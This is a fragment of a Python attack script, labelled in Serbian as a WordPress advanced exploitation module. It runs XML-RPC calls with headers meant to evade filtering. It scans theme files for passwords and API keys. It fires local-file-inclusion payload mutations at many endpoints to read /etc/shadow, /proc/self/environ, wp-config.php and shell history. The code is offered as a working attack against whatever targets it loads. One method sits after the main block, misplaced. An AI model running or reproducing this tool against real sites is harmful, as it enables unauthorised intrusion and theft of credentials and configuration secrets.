                            "User-Agent": ua,
                            "Content-Type": "text/xml",
                            **bypass_header
                        }
                        
                        xml_payload = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>{method}</methodName>
    <params>
    </params>
</methodCall>"""
                        
                        response = self.session.post(
                            target["xmlrpc_url"], 
                            data=xml_payload, 
                            headers=headers,
                            timeout=5
                        )
                        
                        if response.status_code == 200 and "methodResponse" in response.text:
                            bypassed_methods.append({
                                "method": method,
                                "user_agent": ua,
                                "bypass_header": bypass_header,
                                "response": response.text[:500]
                            })
                            print(f"‚úÖ XML-RPC Bypass uspe≈°an: {method}")
                            
                        time.sleep(0.1)
                        
                    except Exception as e:
                        continue
                        
        return bypassed_methods

    def test_theme_specific_exploits(self, target):
        """Testira eksploite specifiƒçne za TwentyTwenty temu"""
        print(f"\nüé® Testiram TwentyTwenty tema eksploite na: {target['base_url']}")
        
        theme_exploits = []
        
        # TwentyTwenty specifiƒçni fajlovi
        theme_files = [
            "/wp-content/themes/twentytwenty/functions.php",
            "/wp-content/themes/twentytwenty/style.css",
            "/wp-content/themes/twentytwenty/index.php",
            "/wp-content/themes/twentytwenty/single.php",
            "/wp-content/themes/twentytwenty/header.php",
            "/wp-content/themes/twentytwenty/footer.php",
            "/wp-content/themes/twentytwenty/screenshot.png",
            "/wp-content/themes/twentytwenty/readme.txt"
        ]
        
        for theme_file in theme_files:
            try:
                url = f"{target['base_url']}{theme_file}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    # Analiziraj sadr≈æaj za osetljive informacije
                    content = response.text
                    
                    sensitive_patterns = [
                        r"define\s*\(\s*['\"].*?['\"]\s*,\s*['\"].*?['\"]\s*\)",
                        r"\$.*?=\s*['\"].*?['\"]",
                        r"mysql_.*?\(",
                        r"mysqli_.*?\(",
                        r"PDO::",
                        r"password.*?=",
                        r"secret.*?=",
                        r"api.*?key"
                    ]
                    
                    import re
                    findings = []
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            findings.extend(matches[:3])  # Ograniƒçi na 3 match-a
                    
                    if findings or len(content) > 100:
                        theme_exploits.append({
                            "file": theme_file,
                            "url": url,
                            "accessible": True,
                            "size": len(content),
                            "findings": findings,
                            "content_preview": content[:300]
                        })
                        print(f"üìÅ Dostupan fajl: {theme_file}")
                        
            except Exception as e:
                continue
                
        return theme_exploits

    def run_full_exploitation(self):
        """Pokreƒáe kompletnu naprednu eksploitaciju"""
        print("üöÄ WordPress Advanced Exploitation Module")
        print("=" * 50)
        
        if not self.load_wp_reports():
            print("‚ùå Nema podataka za eksploitaciju!")
            return
            
        print(f"üéØ Pronaƒëeno {len(self.targets)} target(a) za eksploitaciju")
        
        all_results = {}
        
        for i, target in enumerate(self.targets, 1):
            print(f"\n{'='*50}")
            print(f"üéØ TARGET {i}/{len(self.targets)}: {target['base_url']}")
            print(f"{'='*50}")
            
            target_results = {
                "target_info": target,
                "lfi_mutations": [],
                "xmlrpc_bypass": [],
                "theme_exploits": [],
                "timestamp": datetime.now().isoformat()
            }
            
            # Test LFI mutations
            try:
                target_results["lfi_mutations"] = self.test_lfi_mutations(target)
            except Exception as e:
                print(f"‚ùå LFI test error: {e}")
                
            # Test XML-RPC bypass
            try:
                target_results["xmlrpc_bypass"] = self.test_xmlrpc_bypass(target)
            except Exception as e:
                print(f"‚ùå XML-RPC test error: {e}")
                
            # Test theme-specific exploits
            try:
                target_results["theme_exploits"] = self.test_theme_specific_exploits(target)
            except Exception as e:
                print(f"‚ùå Theme exploit test error: {e}")
                
            all_results[target["base_url"]] = target_results
            
        # Saƒçuvaj rezultate
        self.save_results(all_results)
        self.print_summary(all_results)

    def save_results(self, results):
        """ƒåuva rezultate u JSON fajl"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/wp/wp_advanced_exploit_{timestamp}.json"
        
        os.makedirs("reports/wp", exist_ok=True)
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
            
        print(f"\nüíæ Rezultati saƒçuvani u: {filename}")

    def print_summary(self, results):
        """Prikazuje sa≈æetak rezultata"""
        print("\n" + "="*60)
        print("üìä SA≈ΩETAK REZULTATA")
        print("="*60)
        
        total_lfi = 0
        total_xmlrpc = 0
        total_theme = 0
        
        for target_url, data in results.items():
            lfi_count = len(data["lfi_mutations"])
            xmlrpc_count = len(data["xmlrpc_bypass"])
            theme_count = len(data["theme_exploits"])
            
            total_lfi += lfi_count
            total_xmlrpc += xmlrpc_count
            total_theme += theme_count
            
            if lfi_count > 0 or xmlrpc_count > 0 or theme_count > 0:
                print(f"\nüéØ {target_url}")
                if lfi_count > 0:
                    print(f"   üß™ LFI ranjivosti: {lfi_count}")
                if xmlrpc_count > 0:
                    print(f"   üîß XML-RPC bypass: {xmlrpc_count}")
                if theme_count > 0:
                    print(f"   üé® Dostupni tema fajlovi: {theme_count}")
        
        print(f"\nüìà UKUPNO:")
        print(f"   üß™ LFI ranjivosti: {total_lfi}")
        print(f"   üîß XML-RPC bypass: {total_xmlrpc}")
        print(f"   üé® Tema eksploiti: {total_theme}")
        
        if total_lfi > 0 or total_xmlrpc > 0 or total_theme > 0:
            print(f"\nüéâ EKSPLOITACIJA USPE≈†NA! Pronaƒëeno ukupno {total_lfi + total_xmlrpc + total_theme} ranjivosti!")
        else:
            print(f"\nüõ°Ô∏è  Svi target-i su dobro za≈°tiƒáeni.")

if __name__ == "__main__":
    # Pokreni eksploitaciju
    exploiter = WordPressAdvancedExploit()
    exploiter.run_full_exploitation()

def test_lfi_mutations(self, target):
        """Testira LFI mutacije na target-u"""
        print(f"\nüß™ Testiram LFI mutacije na: {target['base_url']}")
        
        # Generi≈°i payloads za razliƒçite fajlove
        sensitive_files = [
            "etc/passwd",
            "etc/shadow",
            "etc/hosts",
            "proc/version",
            "proc/self/environ",
            "var/log/apache2/access.log",
            "var/log/nginx/access.log",
            "home/www-data/.bash_history",
            # WordPress specifiƒçni fajlovi
            "wp-config.php",
            "wp-content/debug.log",
            ".htaccess"
        ]
        
        vulnerable_endpoints = []
        
        for file_target in sensitive_files:
            mutations = self.generate_lfi_mutations(file_target)
            
            # Testiraj na razliƒçitim endpointovima
            test_endpoints = [
                "/wp-content/themes/twentytwenty/index.php",
                "/wp-content/themes/twentytwenty/functions.php",
                "/wp-includes/template-loader.php",
                "/wp-admin/admin-ajax.php",
                "/index.php",
            ]
            
            for endpoint in test_endpoints:
                for mutation in mutations[:10]:  # Ograniƒçi na 10 najdobrijih mutacija
                    try:
                        for param in ["file", "page", "include", "path", "template", "view"]:
                            test_url = f"{target['base_url']}{endpoint}?{param}={mutation}"
                            
                            # Rotiraj User-Agent i dodaj bypass header-e
                            headers = {"User-Agent": self.user_agents[0]}
                            if self.bypass_headers:
                                headers.update(self.bypass_headers[0])
                            
                            response = self.session.get(test_url, headers=headers, allow_redirects=False)
                            
                            # Analiziraj odgovor
                            if self.analyze_lfi_response(response, file_target):
                                vulnerable_endpoints.append({
                                    "url": test_url,
                                    "payload": mutation,
                                    "parameter": param,
                                    "file_target": file_target,
                                    "status_code": response.status_code,
                                    "response_length": len(response.text),
                                    "evidence": response.text[:200],
                                    "exploit_type": "CONTENT_BASED"
                                })
                                print(f"üéØ RANJIVOST PRONAƒêENA: {test_url}")
                                
                            time.sleep(0.1)  # Rate limiting
                            
                    except Exception as e:
                        continue
        
        return vulnerable_endpoints

